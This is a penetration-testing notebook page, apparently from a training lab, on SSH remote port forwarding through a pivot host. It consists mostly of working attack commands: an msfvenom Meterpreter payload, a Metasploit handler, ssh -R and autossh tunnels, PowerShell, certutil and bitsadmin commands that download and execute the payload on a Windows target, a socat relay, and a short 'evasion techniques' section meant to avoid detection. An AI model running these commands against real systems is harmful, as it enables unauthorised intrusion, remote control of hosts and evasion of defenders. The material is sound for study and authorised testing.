# SSH Remote/Reverse Port Forwarding

**Back to:** [[Pivoting, Tunneling and Port Forwarding|Pivoting Index]]
**Related:** [[SSH Socks Tunnel PF|SSH Dynamic SOCKS Tunnel]], [[SSH Pivoting with Sshuttle|Sshuttle]]

---

## Overview
SSH remote/reverse port forwarding allows you to forward a port on the pivot host back to your attack machine. This is essential for catching reverse shells from internal targets through a pivot.

**Use Cases:**
- Catching reverse shells from internal network
- Forwarding specific services through pivot
- Bypassing firewall restrictions (outbound allowed, inbound blocked)
- Delivering payloads through pivot host

**Advantages:**
- Built-in SSH functionality
- No additional tools required
- Encrypted traffic
- Firewall-friendly (uses outbound SSH)

**Requirements:**
- SSH access from pivot to attacker (reverse direction)
- Listener on attack machine

---

## Attack Scenario Walkthrough

### Network Topology
```
Attack Machine (10.10.14.18:8000) 
    ↑
    | SSH Reverse Tunnel
    |
Pivot Host (Ubuntu: 172.16.5.129:8080 / 10.129.202.64:22)
    ↑
    | Reverse Shell
    |
Internal Target (Windows: 172.16.5.19)
```

---

## Step 1: Create Payload

### Generate Meterpreter Payload
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
  lhost=172.16.5.129 \
  LPORT=8080 \
  -f exe \
  -o backupscript.exe
```

**Key Points:**
- `lhost`: Pivot host's INTERNAL IP (not external)
- `LPORT`: Port on pivot that will forward to you
- Target connects to pivot, pivot forwards to you

---

## Step 2: Configure Metasploit Handler

### Setup Listener on Attack Machine
```bash
msfconsole -q

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 8000
run -j
```

**Explanation:**
- Listener binds to `0.0.0.0:8000` (all interfaces)
- Will receive forwarded connection from pivot
- `-j` runs as background job

---

## Step 3: Transfer Payload to Pivot

### Copy Payload to Ubuntu Pivot
```bash
scp backupscript.exe ubuntu@10.129.202.64:~/
```

**Alternative Methods:**
```bash
# Using wget/curl on pivot
python3 -m http.server 8080  # On attack machine
wget http://10.10.14.18:8080/backupscript.exe  # On pivot

# Using base64 transfer
base64 backupscript.exe | xclip -selection clipboard  # Copy
# Paste and decode on pivot
```

---

## Step 4: Host Payload from Pivot

### Start Web Server on Pivot
```bash
# On pivot host
python3 -m http.server 8123
```

**Purpose:** Internal Windows target can download payload from pivot

---

## Step 5: Setup SSH Reverse Port Forward

### Create Reverse Tunnel
```bash
# From attack machine to pivot
ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.202.64 -vN
```

**Breakdown:**
- `-R`: Remote/Reverse port forward
- `172.16.5.129:8080`: Pivot's internal IP and port (bind here)
- `0.0.0.0:8000`: Your attack machine's listener
- `ubuntu@10.129.202.64`: SSH to pivot
- `-v`: Verbose (see connection logs)
- `-N`: No command execution (just tunnel)

**What This Does:**
```
Traffic to pivot:8080 → SSH tunnel → Your machine:8000
```

### Verify Connection
```bash
# Check SSH debug output
debug1: Remote connections from 172.16.5.129:8080 forwarded to local address 0.0.0.0:8000
debug1: remote forward success for: listen 172.16.5.129:8080
```

---

## Step 6: Download and Execute Payload

### On Windows Internal Target
```powershell
# Download payload from pivot
Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

# Execute payload
C:\backupscript.exe
```

**Alternative Download Methods:**
```powershell
# Using certutil
certutil -urlcache -split -f http://172.16.5.129:8123/backupscript.exe backupscript.exe

# Using bitsadmin
bitsadmin /transfer job /download /priority high http://172.16.5.129:8123/backupscript.exe C:\backupscript.exe
```

---

## Step 7: Catch the Shell

### View Logs from SSH Tunnel
```bash
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: channel 1: connected to 0.0.0.0 port 8000
```

**Flow:**
1. Windows target connects to `172.16.5.129:8080`
2. Pivot forwards to your machine via SSH tunnel
3. Your listener on `0.0.0.0:8000` receives connection

### Interact with Meterpreter Session
```bash
[*] Meterpreter session 1 opened

msf6 exploit(multi/handler) > sessions -i 1
meterpreter > sysinfo
meterpreter > shell
```

---

## Advanced Usage

### Forward Multiple Ports
```bash
# Forward both HTTP and HTTPS handlers
ssh -R 172.16.5.129:8080:0.0.0.0:8000 \
    -R 172.16.5.129:8443:0.0.0.0:4443 \
    ubuntu@10.129.202.64 -vN
```

### Persistent Reverse Tunnel
```bash
# Use autossh for auto-reconnect
autossh -M 0 -f -N \
  -R 172.16.5.129:8080:0.0.0.0:8000 \
  -o "ServerAliveInterval 30" \
  -o "ServerAliveCountMax 3" \
  ubuntu@10.129.202.64
```

### SSH Config for Quick Setup
Add to `~/.ssh/config`:
```
Host pivot-reverse
    HostName 10.129.202.64
    User ubuntu
    RemoteForward 172.16.5.129:8080 0.0.0.0:8000
    ServerAliveInterval 30
    ServerAliveCountMax 3
```

Usage:
```bash
ssh -N pivot-reverse
```

---

## Comparison: Local vs Remote Forward

### Local Forward (`-L`)
```bash
ssh -L 1234:target:3306 user@pivot
```
- Access pivot's network FROM your machine
- You connect to localhost:1234
- Pivot forwards to target:3306

### Remote Forward (`-R`)
```bash
ssh -R pivot:8080:0.0.0.0:8000 user@pivot
```
- Pivot's network accesses YOUR machine
- Target connects to pivot:8080
- Pivot forwards to your machine:8000

---

## Troubleshooting

### GatewayPorts Error
If remote forward fails, check SSH server config on pivot:

```bash
# On pivot: /etc/ssh/sshd_config
GatewayPorts yes  # Or GatewayPorts clientspecified

# Restart SSH
sudo systemctl restart sshd
```

**Without GatewayPorts:**
- Can only bind to localhost on pivot
- Use: `ssh -R 127.0.0.1:8080:0.0.0.0:8000`

**With GatewayPorts:**
- Can bind to any interface
- Use: `ssh -R 172.16.5.129:8080:0.0.0.0:8000`

### Connection Issues
```bash
# Check if port is listening on pivot
netstat -tulpn | grep 8080

# Check firewall on pivot
sudo iptables -L -n | grep 8080

# Test connection from pivot to your listener
nc -zv 10.10.14.18 8000
```

### Payload Not Executing
```bash
# Verify web server is accessible from Windows target
# On Windows target:
curl http://172.16.5.129:8123/backupscript.exe

# Check Windows Defender / AV
Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
```

---

## Alternative: Using Socat

If SSH isn't available, use [[Socat Redirection with a Reverse Shell|Socat]]:

```bash
# On pivot
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:8000
```

---

## Operational Security

### Detection Indicators
- Unusual SSH connection duration
- SSH traffic with high data transfer
- Outbound SSH from internal hosts
- Reverse tunnels in SSH logs
- Non-standard SSH port forwarding

### Evasion Techniques
```bash
# Use non-standard port for SSH
ssh -R 172.16.5.129:8080:0.0.0.0:8000 -p 443 user@pivot

# Compress traffic
ssh -C -R 172.16.5.129:8080:0.0.0.0:8000 user@pivot

# Limit cipher to blend in
ssh -c aes256-ctr -R 172.16.5.129:8080:0.0.0.0:8000 user@pivot
```

---

## Quick Reference

```bash
# Basic reverse forward
ssh -R pivot_ip:pivot_port:0.0.0.0:local_port user@pivot

# With verbose and no command
ssh -R 172.16.5.129:8080:0.0.0.0:8000 user@pivot -vN

# Background process
ssh -f -N -R 172.16.5.129:8080:0.0.0.0:8000 user@pivot

# Multiple forwards
ssh -R 172.16.5.129:8080:0.0.0.0:8000 \
    -R 172.16.5.129:8443:0.0.0.0:4443 \
    user@pivot -N

# Kill tunnel
pkill -f "ssh -R"
```

---

**See Also:**
- [[Pivoting, Tunneling and Port Forwarding|Main Pivoting Index]]
- [[SSH Socks Tunnel PF|SSH Dynamic SOCKS Tunnel]]
- [[Socat Redirection with a Reverse Shell|Socat Alternative]]
- [[Meterpreter Tunneling & Port Forwarding/Meterpreter Tunneling & Port Forwarding|Meterpreter Port Forwarding]]

**Tags:** #ssh #reverse-forward #port-forwarding #pivoting #reverse-shell #meterpreter